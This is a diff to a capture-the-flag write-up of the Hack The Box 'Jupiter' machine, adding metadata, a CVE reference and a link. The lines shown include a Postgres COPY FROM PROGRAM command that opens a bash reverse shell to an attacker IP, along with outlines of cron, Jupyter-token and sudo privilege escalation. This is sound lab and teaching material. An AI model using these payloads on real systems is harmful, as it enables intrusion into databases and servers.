@@ -5,6 +5,7 @@ subtitle: "Grafana SQL panel to Postgres COPY FROM PROGRAM, then three local hop
 date: 2023-06-11
 tags: [htb, linux, grafana, postgresql, jupyter, sudo]
 category: writeups
+kind: machine
 tldr: "A kiosk subdomain ran Grafana 9.5.2, whose query endpoint let me run raw SQL against Postgres. COPY FROM PROGRAM gave a shell as postgres. From there a world-writable shadow simulation config run by a cron got me juno, a leaked Jupyter Notebook token got me jovian, and a sudo sattrack binary that reads /tmp/config.json let me write root's authorized_keys."
 ---
 
@@ -27,7 +28,7 @@ The kiosk dashboard panels query Postgres through Grafana's `/api/ds/query` endp
 PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1) ...
 ```
 
-Postgres can run shell commands through `COPY ... FROM PROGRAM`, so I dropped a reverse shell straight into the SQL:
+Postgres can run shell commands through `COPY ... FROM PROGRAM` (the technique tracked as CVE-2019-9193), so I dropped a reverse shell straight into the SQL:
 
 ```sql
 COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.83/1337 0>&1"'
@@ -120,3 +121,7 @@ I hosted my public key as `authorized_keys`, ran `sudo sattrack`, and it downloa
 ## takeaway
 
 Five identities to reach root, and each hop was its own misconfiguration. Grafana trusting a client-supplied SQL query, a cron reading a 777 config, a notebook token sitting in a group-readable log, and a sudo binary that takes its file destinations from an attacker-writable config. None needed an exploit, just trusting input that should not be trusted.
+
+## references
+
+- [0xdf - HTB: Jupiter](https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html)
